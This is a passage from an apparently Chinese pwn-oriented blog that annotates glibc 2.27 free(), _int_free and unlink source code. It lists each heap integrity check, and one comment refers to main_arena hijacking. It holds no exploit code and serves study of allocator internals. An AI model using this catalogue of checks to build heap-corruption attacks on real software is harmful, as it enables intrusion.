<span class="meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init(); <span class="comment">/* 对tcache进行初始化 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> counts[TCACHE_MAX_BINS]; <span class="comment">/* 这里是1字节,在libc-2.31中就变成了2字节 */</span></span><br><span class="line">    tcache_entry* entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<ul>
<li>__libc_free：free函数的具体实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free(<span class="keyword">void</span>* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr; <span class="comment">/* 管理arena的结构体 */</span></span><br><span class="line">    mchunkptr p; <span class="comment">/* 管理chunk的结构体 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>*, <span class="keyword">const</span> <span class="keyword">void</span>*)</span><br><span class="line">        = atomic_forced_read(__free_hook); <span class="comment">/* 原子读__free_hook */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>)); <span class="comment">/* 执行__free_hook */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem); <span class="comment">/* 获取chunk头 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* 如果该chunk是mmap分配的(通过检查M位) */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold</span><br><span class="line">            &amp;&amp; chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">            &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK(p))</span><br><span class="line">        &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p); <span class="comment">/* 调用munmap_chunk进行chunk的回收(不是重点) */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE(); <span class="comment">/* 新增:对tcache进行初始化(libc-2.27开启了tcache) */</span></span><br><span class="line"></span><br><span class="line">    ar_ptr = arena_for_chunk(p); <span class="comment">/* 根据chunk头地址,获取对应的arena */</span></span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>); <span class="comment">/* 核心 */</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__libc_free) <span class="comment">/* 进行延迟绑定 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和 chunk-&gt;size 有关的宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size) <span class="comment">/* 获取chunk-&gt;size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS)) <span class="comment">/* 获取真正的size */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>_int_free：<code>__libc_free</code> 的核心部分</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;        <span class="comment">/* 记录chunk-&gt;size */</span></span><br><span class="line">    mfastbinptr* fb;             <span class="comment">/* 用于关联fastbin */</span></span><br><span class="line">    mchunkptr nextchunk;         <span class="comment">/* 物理相邻的下一个chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T nextsize;    <span class="comment">/* 记录nextchunk-&gt;size */</span></span><br><span class="line">    <span class="keyword">int</span> nextinuse;               <span class="comment">/* 如果使用nextchunk,则为true */</span></span><br><span class="line">    INTERNAL_SIZE_T prevsize;    <span class="comment">/* 记录lastchunk-&gt;size */</span></span><br><span class="line">    mchunkptr bck;               <span class="comment">/* link使用的&quot;临时上一个chunk&quot; */</span></span><br><span class="line">    mchunkptr fwd;               <span class="comment">/* link使用的&quot;临时下一个chunk&quot; */</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p); <span class="comment">/* 获取真正的chunk-&gt;size(为了和chunksize_nomask区分) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect((<span class="keyword">uintptr_t</span>)p &gt; (<span class="keyword">uintptr_t</span>)-size, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">    <span class="comment">/* 检查1: 简单检查一下chunk头指针的合理性 &amp;&amp; 实现对齐后的chunk不为空 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line">    <span class="comment">/* 检查2: chunk的大小必须大于MINSIZE(4字) &amp;&amp; 检查chunk-&gt;size是否对齐 */</span></span><br><span class="line"></span><br><span class="line">    check_inuse_chunk(av, p); <span class="comment">/* DE<span class="doctag">BUG:</span>检查chunk的前一个chunk是否不被使用 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE <span class="comment">/* 如果启用TCACHE */</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx(size); <span class="comment">/* 获取对应tcachebin */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache</span><br><span class="line">            &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">            <span class="comment">/* 初始化为TCACHE_MAX_BINS,表示tcachebin的最大数量 */</span></span><br><span class="line">            &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">            <span class="comment">/* 初始化为7,表示在同一个tcachebin中,chunk的最大值 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx); <span class="comment">/* 会将该free的块插入到对应idx的bin的第一个位置上(插头) */</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* tcache_perthread_struct有和main_arena相似的性质:</span></span><br><span class="line"><span class="comment">        会根据tcachebin的大小来决定tcachebin-&gt;count和tcachebin-&gt;entry的位置</span></span><br><span class="line"><span class="comment">        如果不对tc_idx进行限制,那么过大的size很可能超过tcache_perthread_struct的范围</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast())</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">        <span class="comment">/* 如果会和top chunk合并,则新增一个条件:nextchunk不是top chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        ) &#123;</span><br><span class="line">        <span class="comment">/* 情况1:会进入fastbin */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size))</span><br><span class="line">            &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            <span class="comment">/* 检查3: nextchunk-&gt;size必须大于2字(当size刚好等于2字时,nextchunk-&gt;P不能为0) ,nextchunk-&gt;size不能大于或等于system_mem */</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) <span class="comment">/* 如果有锁,就进行解锁(过程有点看不懂) */</span></span><br><span class="line">            &#123;</span><br><span class="line">                __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">                    || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fail)</span><br><span class="line">                malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">/* 设置perturb_byte */</span></span><br><span class="line"></span><br><span class="line">        atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">true</span>); <span class="comment">/* 检查是否有fastbin */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size); <span class="comment">/* 获取对应的index */</span></span><br><span class="line">        fb = &amp;fastbin(av, idx); <span class="comment">/* 获取对应的fastbin */</span></span><br><span class="line"></span><br><span class="line">        mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">/* 如果是单线程 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">            <span class="comment">/* 检查4: 检查原链表头的chunk是否等于p,经典Double free检查 */</span></span><br><span class="line">            p-&gt;fd = old;</span><br><span class="line">            *fb = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">/* 如果是多线程 */</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">                p-&gt;fd = old2 = old;</span><br><span class="line">                <span class="comment">/* 检查4: 检查原链表头的chunk是否等于p,经典Double free检查 */</span></span><br><span class="line">            &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))</span><br><span class="line">                != old2);</span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">                &amp;&amp; __builtin_expect(fastbin_index(chunksize(old)) != idx, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr(<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">            <span class="comment">/* 检查5: 检查顶部fastbin区块的大小是否是我们要添加的块的大小 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 情况2:不会进入fastbin,并且不是mmap分配的(在其他未映射的块到达时合并它们) */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">/* 如果是单线程,则不需要锁定arena(SINGLE_THREAD_P=1) */</span></span><br><span class="line">            have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!have_lock)</span><br><span class="line">            __libc_lock_lock(av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">        nextchunk = chunk_at_offset(p, size); <span class="comment">/* 获取nextchunk-&gt;head */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">        <span class="comment">/* 检查6: 当前chunk不能是top chunk(不能free top chunk) */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(contiguous(av)</span><br><span class="line">            &amp;&amp; (<span class="keyword">char</span>*)nextchunk</span><br><span class="line">            &gt;= ((<span class="keyword">char</span>*)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">        <span class="comment">/* 检查7: 检查nextchunk是否超出了竞技场的边界 */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line">        <span class="comment">/* 检查8: 该chunk是否在使用(必须是alloc状态) */</span></span><br><span class="line"></span><br><span class="line">        nextsize = chunksize(nextchunk);</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">        <span class="comment">/* 检查9: nextchunk-&gt;size必须大于2字,小于malloc_state-&gt;system_mem(同检查3) */</span></span><br><span class="line">        </span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 后向合并 */</span></span><br><span class="line">        <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = prev_size(p);</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 前向合并 */</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">                unlink(av, nextchunk, bck, fwd);</span><br><span class="line">                size += nextsize;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 合并后的chunk插入unsortedbin的链表头 */</span></span><br><span class="line">            bck = unsorted_chunks(av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">                malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">            <span class="comment">/* 检查10: 相当于 bck-&gt;fd-&gt;bk != bck,只要不破坏main_arena,通过这个检查应该没有什么问题(就是在进行main_arena劫持的时候,会造成影响) */</span></span><br><span class="line">            </span><br><span class="line">            p-&gt;fd = fwd;</span><br><span class="line">            p-&gt;bk = bck;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bck-&gt;fd = p;</span><br><span class="line">            fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            set_foot(p, size);</span><br><span class="line"></span><br><span class="line">            check_free_chunk(av, p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 和top chunk合并 */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">            check_chunk(av, p); <span class="comment">/* DE<span class="doctag">BUG:</span>简单检查 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">            <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))</span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">                <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">                    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">                    systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                heap_info* heap = heap_for_ptr(top(av));</span><br><span class="line">                assert(heap-&gt;ar_ptr == av);</span><br><span class="line">                heap_trim(heap, mp_.top_pad);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!have_lock)</span><br><span class="line">            __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        munmap_chunk(p); <span class="comment">/* 如果是mmap分配出来的chunk,直接进行回收 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在 free 函数就分析完毕了：</p>
<ul>
<li>libc-2.27 加入了 tcache 机制，_int_free 会首先尝试把 free chunk 放入 tcachebin</li>
<li>和 libc-2.23 相比，总体上没有什么变化</li>
</ul>
<p>最后看 unlink：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">        <span class="comment">/* 检查1: 检查chunk-&gt;size是否等于nextchunk-&gt;presize */</span></span><br><span class="line">		malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        <span class="comment">/* 检查2: 检查nextchunk-&gt;bk是不是chunk,检查lastchunk-&gt;fd是不是chunk */</span></span><br><span class="line">    	malloc_printerr(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(chunksize_nomask(P))</span><br><span class="line">            &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">                || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">            <span class="comment">/* 检查3: 检查1的largebin版本,主要用于横向链表(用fd_nextsize和bk_nextsize组织的链表,用于管理同一largebin中,不同size的large chunk) */</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>只多了一个检查而已</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/Ucore-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/19/Ucore-Lab4/" class="post-title-link" itemprop="url">Ucore-Lab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

